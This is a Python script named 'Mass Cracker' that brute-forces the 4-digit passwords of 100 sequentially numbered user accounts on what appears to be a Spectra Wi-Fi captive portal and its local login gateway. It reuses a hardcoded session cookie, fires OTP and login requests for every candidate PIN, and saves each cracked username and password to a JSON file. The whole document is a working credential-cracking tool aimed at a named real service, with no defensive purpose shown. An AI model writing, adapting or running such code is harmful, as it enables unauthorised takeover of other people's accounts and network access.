import requests
import json

base_url = 'http://10.201.21.1'
usernames = []
for i in range(100):
    usernames.append("23TSFBA"+f'{i:03}')
print(usernames)

def logged_in(password_str=-1):
    status_response = requests.get(base_url, allow_redirects=False)

    if status_response.status_code == 302:
        redirect_url = status_response.headers['Location']
        if redirect_url==base_url+"/status":
            return True  # Exit the loop if login and status check are successful
        elif redirect_url==base_url+"/login":
            # print()
            return False
        else:
            final_response = requests.get(redirect_url)
            print("something is wrong!")
            print(redirect_url)
            print(final_response.headers)
            return None

def logout():
    logout = requests.get('http://10.201.21.1/logout?')
    if not logged_in():
        print("you are logged out.\n\n")
    else:
        print("error logging out.")

def load_passwords_data():
    try:
        with open('passwords.json', 'r') as passwords_file:
            return json.load(passwords_file)
    except FileNotFoundError:
        return {}


# Define the base URL

# Define the range of usernames

print("Welcome to Mass Cracker!")

# Loop over each username
for username in usernames:
    logout()
    print(f"Finding password for: {username}\n\n")
    # Loop over the range of passwords
    for password in range(0, 10000):
        # First POST request
        otp_url = 'http://wifiunify38.spectra.co/userportal/pages/usermedia/spectra3/stanza-disable-random-mac/otp.jsp'
        otp_data = {
            'memberId': username
        }
        otp_cookies = {
            'JSESSIONID': 'A7A0859DC5ED1606979E3C1BDB502A78'
        }
        otp_response = requests.post(otp_url, data=otp_data, cookies=otp_cookies)

        # Second POST request
        login_url = 'http://wifiunify38.spectra.co/userportal/newlogin.do'
        login_data = {
            'username': 'STN-'+username,
            'password': password,
            'type': '2',
            'phone': '0',
            'jsonresponse': '1'
        }
        login_cookies = {
            'JSESSIONID': 'A7A0859DC5ED1606979E3C1BDB502A78'
        }
        login_response = requests.post(login_url, data=login_data, cookies=login_cookies)

        # Third POST request
        magic_url = 'http://10.201.21.1/login'
        magic_data = {
            'username': 'STN-'+username,
            'password': password,
            'magic': ''
        }
        magic_response = requests.post(magic_url, data=magic_data)

        # Convert the password to a 4-digit string
        password_str = f'{password:04}'

        # Define the data for the request
        magic_data = {
            'username': username,
            'password': password_str,
            'magic': ''
        }

        status_response = requests.get(f'{base_url}/')
        if logged_in(password_str):
            print(f"Login successful for username: {username}, password: {password_str}")

            # Write the username and password to a file
            passwords_data=load_passwords_data()
            passwords_data[username] = password
            with open('passwords.json', 'w') as passwords_file:
                json.dump(passwords_data, passwords_file, indent=4)

            break  # Exit the loop if login and status check are successful
        print("not connected, checked:", password)